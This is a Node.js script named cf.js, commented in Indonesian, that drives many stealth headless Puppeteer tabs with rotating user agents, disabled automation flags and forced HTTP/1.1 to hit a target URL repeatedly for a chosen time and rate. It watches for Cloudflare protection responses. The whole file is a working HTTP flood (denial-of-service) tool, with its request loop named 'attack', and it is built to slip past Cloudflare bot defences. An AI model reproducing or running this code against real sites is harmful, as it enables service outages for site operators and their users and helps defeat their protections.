const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');

puppeteer.use(StealthPlugin());

const args = process.argv.slice(2);
if (args.length < 4) {
    console.log("Usage: node cf.js <url> <time> <rate> <tabs>");
    process.exit(1);
}

const url = args[0];
const time = parseInt(args[1]); // Waktu dalam detik
const rate = parseInt(args[2]); // Jumlah request per detik
const tabs = parseInt(args[3]); // Jumlah tab paralel

if (isNaN(time) || isNaN(rate) || isNaN(tabs)) {
    console.error("[!] Pastikan waktu, rate, dan jumlah tab adalah angka yang valid.");
    process.exit(1);
}

// Daftar User-Agent yang lebih bervariasi
const userAgents = [
    "Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-A715F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_2_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-N960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:88.0) Gecko/20100101 Firefox/88.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.3; rv:99.0) Gecko/20100101 Firefox/99.0",
    "Mozilla/5.0 (Linux; Android 9; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.115 Mobile Safari/537.36"
];
const randomUserAgent = () => userAgents[Math.floor(Math.random() * userAgents.length)];

(async () => {
    const browser = await puppeteer.launch({
        headless: "new",
        args: [
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-web-security',
            '--disable-features=IsolateOrigins,site-per-process',
            '--disable-blink-features=AutomationControlled',
            '--disable-gpu',
            '--disable-software-rasterizer',
            '--disable-http2', // **Memaksa HTTP/1.1**
            '--proxy-server=http=127.0.0.1:8080' // **(Opsional) Menambah Proxy**
        ]
    });

    console.log(`[1] Membuka ${tabs} tab untuk mengakses ${url} menggunakan HTTP/1.1...`);

    let pages = [];
    for (let i = 0; i < tabs; i++) {
        let page = await browser.newPage();
        await page.setUserAgent(randomUserAgent());
        await page.setViewport({ width: 360, height: 740 });

        // **Memaksa HTTP/1.1 dengan menonaktifkan HTTP/2**
        await page.setExtraHTTPHeaders({
            'Upgrade-Insecure-Requests': '1',
            'Connection': 'keep-alive',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
        });

        // Blokir gambar & font agar request lebih ringan
        await page.setRequestInterception(true);
        page.on('request', (req) => {
            if (["image", "stylesheet", "font"].includes(req.resourceType())) {
                req.abort();
            } else {
                req.continue();
            }
        });

        // Menambahkan deteksi proteksi Cloudflare
        page.on('response', (response) => {
            if (response.status() === 403 && response.url().includes('cloudflare')) {
                console.log(`[⚠️] Cloudflare Proteksi terdeteksi di ${url}`);
            }
        });

        pages.push(page);
    }

    console.log("[2] Memulai pengiriman request...");

    let endTime = Date.now() + time * 1000;
    let requestsSent = 0;

    const attack = async (page, index) => {
        while (Date.now() < endTime) {
            try {
                await page.goto(url, { waitUntil: 'domcontentloaded', timeout: 30000 });

                // Simulasi interaksi pengguna
                await page.evaluate(() => window.scrollBy(0, Math.random() * 1000));

                requestsSent++;
                console.log(`[✔] Tab ${index + 1} sukses request ke ${url} (Total: ${requestsSent})`);
            } catch (err) {
                console.error(`[✘] Tab ${index + 1} gagal: ${err.message}`);
            }
            await new Promise(res => setTimeout(res, 1000 / rate)); // Kontrol rate per tab
        }
    };

    pages.forEach((page, index) => attack(page, index));

    setTimeout(async () => {
        console.log("[3] Menutup browser...");
        await browser.close();
    }, time * 1000);
})();